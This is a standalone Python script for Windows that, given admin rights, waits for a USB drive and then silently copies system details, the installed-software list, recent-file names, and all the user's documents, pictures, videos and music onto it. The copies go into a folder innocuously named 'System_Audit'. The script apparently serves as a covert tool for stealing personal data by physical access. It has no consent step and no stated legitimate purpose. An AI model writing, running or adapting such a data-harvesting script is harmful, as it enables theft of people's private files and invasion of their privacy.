import os
import platform
import shutil
import socket
import psutil
import time
import ctypes
import subprocess
from datetime import datetime

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def open_cmd():
    subprocess.Popen("cmd.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)

def get_system_info():
    return {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Username": os.getlogin(),
        "IP Address": socket.gethostbyname(socket.gethostname())
    }

def get_installed_software():
    installed_software = []
    if platform.system() == "Windows":
        try:
            import winreg
            reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    subkey_name = winreg.EnumKey(key, i)
                    with winreg.OpenKey(key, subkey_name) as subkey:
                        try:
                            installed_software.append(winreg.QueryValueEx(subkey, "DisplayName")[0])
                        except FileNotFoundError:
                            pass
        except Exception as e:
            installed_software.append(f"Error: {str(e)}")
    return installed_software

def get_recent_files():
    recent_path = os.path.join(os.path.expanduser("~"), "Recent")
    return os.listdir(recent_path) if os.path.exists(recent_path) else []

def get_user_documents():
    doc_path = os.path.join(os.path.expanduser("~"), "Documents")
    return [os.path.join(doc_path, file) for file in os.listdir(doc_path) if os.path.isfile(os.path.join(doc_path, file))] if os.path.exists(doc_path) else []

def get_media_files():
    media_extensions = (".png", ".jpg", ".jpeg", ".gif", ".mp4", ".avi", ".mkv", ".mp3")
    media_files = []
    user_dirs = [os.path.join(os.path.expanduser("~"), "Pictures"), os.path.join(os.path.expanduser("~"), "Videos"), os.path.join(os.path.expanduser("~"), "Music")]
    for directory in user_dirs:
        if os.path.exists(directory):
            for file in os.listdir(directory):
                if file.endswith(media_extensions):
                    media_files.append(os.path.join(directory, file))
    return media_files

def get_connected_usb():
    return [device.device for device in psutil.disk_partitions() if 'removable' in device.opts]

def copy_files_to_usb(usb_path, output_folder):
    if not os.path.exists(usb_path):
        return False
    
    dest_path = os.path.join(usb_path, output_folder)
    os.makedirs(dest_path, exist_ok=True)
    
    with open(os.path.join(dest_path, "system_info.txt"), "w") as f:
        for key, value in get_system_info().items():
            f.write(f"{key}: {value}\n")
    
    with open(os.path.join(dest_path, "installed_software.txt"), "w") as f:
        f.writelines(f"{software}\n" for software in get_installed_software())
    
    with open(os.path.join(dest_path, "recent_files.txt"), "w") as f:
        f.writelines(f"{file}\n" for file in get_recent_files())
    
    doc_dest_path = os.path.join(dest_path, "Documents")
    os.makedirs(doc_dest_path, exist_ok=True)
    for doc in get_user_documents():
        shutil.copy(doc, doc_dest_path)
    
    media_dest_path = os.path.join(dest_path, "Media")
    os.makedirs(media_dest_path, exist_ok=True)
    for media in get_media_files():
        shutil.copy(media, media_dest_path)
    
    return True

def main():
    if not is_admin():
        return
    
    open_cmd()
    
    while True:
        usb_devices = get_connected_usb()
        if usb_devices:
            if copy_files_to_usb(usb_devices[0], "System_Audit"):
                break
        time.sleep(3)

if __name__ == "__main__":
    main()
